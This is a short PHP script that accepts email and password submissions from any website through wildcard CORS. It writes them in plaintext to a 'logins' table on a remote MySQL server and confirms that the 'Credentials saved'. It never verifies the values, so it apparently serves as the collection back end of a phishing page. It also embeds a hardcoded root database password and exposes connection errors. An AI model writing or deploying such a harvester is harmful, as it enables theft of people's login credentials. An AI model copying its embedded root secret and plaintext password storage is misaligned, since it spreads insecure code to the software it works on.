<?php
// Handle CORS
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type");

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

// Read JSON input
$data = json_decode(file_get_contents("php://input"), true);

$email = $data['email'] ?? $_POST['email'] ?? '';
$password = $data['password'] ?? $_POST['password'] ?? '';

if (empty($email) && empty($password)) {
    echo json_error("No credentials provided");
    exit;
}

// Database Configuration
$host = "yamabiko.proxy.rlwy.net";
$port = "28290";
$user = "root";
$pass = "aASvyubAxGiDfLWTSUVcUzHqgubIkcCb";
$db_name = "railway";

// Create connection without selecting DB first
$conn = new mysqli($host, $user, $pass, "", $port);

if ($conn->connect_error) {
    echo json_error("Connection failed: " . $conn->connect_error);
    exit;
}

// Optional: Connection check for debugging
// echo "Connection established to Railway MySQL on port $port\n";

// Create database if it doesn't exist
$sql = "CREATE DATABASE IF NOT EXISTS $db_name";
if (!$conn->query($sql)) {
    echo json_error("Error creating database: " . $conn->error);
    exit;
}

// Select the database
$conn->select_db($db_name);

// Create table if it doesn't exist
$table_sql = "CREATE TABLE IF NOT EXISTS logins (
    id INT(6) UNSIGNED AUTO_INCREMENT PRIMARY KEY,
    email VARCHAR(255) NOT NULL,
    password VARCHAR(255) NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)";

if (!$conn->query($table_sql)) {
    echo json_error("Error creating table: " . $conn->error);
    exit;
}

// Insert credentials
$stmt = $conn->prepare("INSERT INTO logins (email, password) VALUES (?, ?)");
$stmt->bind_param("ss", $email, $password);

if ($stmt->execute()) {
    echo json_encode([
        "status" => "success",
        "message" => "Credentials saved to 'logins' table",
        "database" => "connected"
    ]);
} else {
    echo json_error("Error inserting record: " . $conn->error);
}

$stmt->close();
$conn->close();

function json_error($message)
{
    return json_encode(["status" => "error", "message" => $message]);
}
?>